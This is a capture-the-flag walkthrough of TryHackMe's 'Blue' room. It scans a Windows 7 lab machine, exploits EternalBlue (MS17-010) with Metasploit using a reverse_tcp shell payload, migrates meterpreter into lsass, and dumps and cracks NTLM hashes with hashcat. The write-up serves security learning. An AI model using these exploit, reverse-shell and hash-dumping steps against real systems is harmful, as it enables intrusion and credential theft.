
# CTF Room: Blue
**Platform:** [THM](https://tryhackme.com/room/blue)
**Difficulty:** Easy
**Category:** EternalBlue (CVE)

## 1. Brief
Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

## 2. Questions
#### Task 1: Recon
Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. **This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.**

### NMAP Scan
```bash
nmap -sV -sC -Pn -p- blue.thm
```
```bash  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 17:07 +0100
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 17:09 (0:00:22 remaining)
Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 44.44% done; ETC: 17:09 (0:00:39 remaining)
Nmap scan report for blue.thm (10.80.187.168)
Host is up (0.020s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2026-04-06T16:09:31+00:00
|_ssl-date: 2026-04-06T16:09:37+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2026-04-05T16:07:20
|_Not valid after:  2026-10-05T16:07:20
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
49177/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 0a:7f:8f:16:c0:c7 (unknown)
| smb2-time: 
|   date: 2026-04-06T16:09:32
|_  start_date: 2026-04-06T16:06:35
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-04-06T11:09:32-05:00
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h00m00s, deviation: 2h14m10s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.89 seconds

```

From this extensive scan, we can see that the following ports are open:
- 135
- 139
- 445
The machine is exposing its SMB service to us, older versions of SMB are well known to have been riddled with vulnerabilities, lets enumerate the service more and see what we have on this machine. 
### SMB service enumeration
```bash  
nmap -p445 --script smb-protocols blue.thm
```
```bash  
tarting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 17:10 +0100
Nmap scan report for blue.thm (10.80.187.168)
Host is up (0.023s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|_    2.1

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Now, I will use the smb-enum-shares script to see what shares are accessible and if any have anonymous access. We find that this is not the case and so will need some credentials. Rats! 
### SMB share enumeration
```bash  
nmap -p 139,445 --script smb-enum-shares blue.thm
```
```bash  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 17:11 +0100
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for blue.thm (10.80.187.168)
Host is up (0.022s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.80.187.168\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.80.187.168\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.80.187.168\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ

Nmap done: 1 IP address (1 host up) scanned in 19.97 seconds

```

So, we know that we need credentials that we currently do not have. We also konw that this machine is using SMBv1. Lets investigate vulnerabilities within SMBv1 on Windows. Elementary my dear Watson, it would appear we have a vulnerability called **EternalBlue**... What is this? 


> [!EternalBlue] EternalBlue {MS17-010}
> EternalBlue is a vulnerability exploit developed by the NSA, it was held as a zero-day undisclosed exploit by the NSA until 2017, when the hacking group "Shadow Brokers" released it into the public eye.
> 
> The vulnerability (MS17-010) allows attackers to execute arbitrary code on a system by sending custom messages to the SMBv1 server. It was patched following its disclosure but leaves SMBv1 vulnerable. 
> 
> An interesting point to note is that if one device is infected via EternalBlue, it puts other devices on the network at risk. A good example of this is the WannaCry ransomware attack against the NHS. 

#### Task 2: Gaining Access
Exploit the machine and gain a foothold.

Lets start up metasploit and take advantage of this vulnerability using the pre-packaged exploit. 
### Starting Metasploit and locating the package
```bash  
msfconsole
```
```bash  
msf > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   Yes    MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```
### EternalBlue configuration
```bash  
use exploit/windows/smb/ms17_010_eternalblue

msf6 exploit(windows/smb/ms17_010_eternalblue) > options
```
```bash  
msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploi
                                             t.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Wi
                                             ndows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Window
                                             s 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windo
                                             ws Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.145.145  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

```

Now that we have the options for this exploit, we can set it ready to run and exploit the machine :) 

### EternalBlue set options 
```bash  
set RHOSTS blue.thm 
set payload windows/x64/shell/reverse_tcp
run 
```

We should see that the exploit has run and we have gained a shell on the machine, if not go back a step and ensure all settings are correct. Assuming you have made it to this stage, lets now try and upgrade to a Meterpreter shell!

#### Task 3: Escalate
Escalate privileges, learn how to upgrade shells in metasploit.

> [!Meterpreter] Meterpreter Shells
> When using MSF, we can upgrade from a regular shell to a meterpreter shell, this is a native metasploit shell that gives us many more features than a regular shell like being able to quickly deploy kiwi (mimikatz) to escalate to root. 
> 
> To do this, we can use the package: **post/multi/manage/shell_to_meterpreter**

```bash  
sessions -u 2
```

Now that we have a meterpreter session on the machine, lets use ps to investigate the processes on this system. 


```bash  
ps
```
```  
Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 544   492   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 552   684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 588   684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 592   492   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 600   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 640   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 684   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 704   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 712   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 816   684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 888   684   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 940   684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1004  640   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1080  684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1204  684   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1352  684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1404  684   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1484  684   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1600  684   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1828  816   WmiPrvSE.exe
 1920  2192  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 1976  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2068  1600  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
 2076  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2192  684   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2216  684   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 2356  684   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 2412  684   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2980  684   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 3012  684   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 3052  684   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
```

We locate the process that is running as NT AUTHORITY\SYSTEM as **lsass.exe**. We migrate to it using its PID (**704**)

```bash  
migrate 704
```
```  

```


> [!meterpreter elevate] Escalation via meterpreter
> Please note, whilst the room shows you how to escalate via the main shell we spawned it is also possible to escalate through other methods in the meterpreter shell. Feel free to do the room again and investigate this, commands like sysinfo and hashdump allow us to grab key system data needed to gain credentials. Once we have said credentials, hashcat can be used to retrieve the plaintext password!

#### Task 4: Cracking
Dump the non-default user's password and crack it!

As mentioned above we can run the command hashdump. 

```bash  
hashdump

echo "hash" >> Jon.hash
```
```  
meterpreter > migrate 704
[*] Migrating from 2192 to 704...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

```

Once we have the password hash for the non-default user (Jon) we can crack it using hashcat :) 

```bash  
hashcat -m 1000 /usr/share/wordlists/rockyou.txt Jon.hash
```
```  
hashed password > plaintext password :) 
```

Now we have the credentials **Jon:alqfna22**, using this we can login legitimately at any time, the user belongs to us now. 

#### Task 5: Find flags!
Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!

Lets start at the root directory, could there be a flag there? 
```bash  
cd C:\
dir
cat flag1.txt

Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 03:13:36 +0000  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 06:08:56 +0100  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 04:20:08 +0100  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 22:22:01 +0000  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 22:28:38 +0000  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 22:35:57 +0000  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 03:13:22 +0000  Recovery
040777/rwxrwxrwx  4096   dir   2026-04-06 17:47:11 +0100  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 03:13:28 +0000  Users
040777/rwxrwxrwx  16384  dir   2026-04-06 17:22:34 +0100  Windows
040777/rwxrwxrwx  0      dir   2026-04-06 17:07:28 +0100  badr
100666/rw-rw-rw-  24     fil   2019-03-17 19:27:21 +0000  flag1.txt
000000/---------  0      fif   1970-01-01 01:00:00 +0100  hiberfil.sys
000000/---------  0      fif   1970-01-01 01:00:00 +0100  pagefile.sys

```  

Next, can we find a flag where passwords are stored on Windows, lets have a look...
```bash
cd C:\Windows\System32\Config
pwd
dir | findstr "flag*"
```
```
flag2.txt should be visible! 
```

Great Success! Now, lets find flag 3, we know that it is in an excellent location to loot, lets have a look in Jon's Documents folder... 
```
cd C:\Users\Jon\Documents
pwd
dir
```
```
flag3.txt is in there! 
```

Perfect! 3 flags retrieved, very well done :) 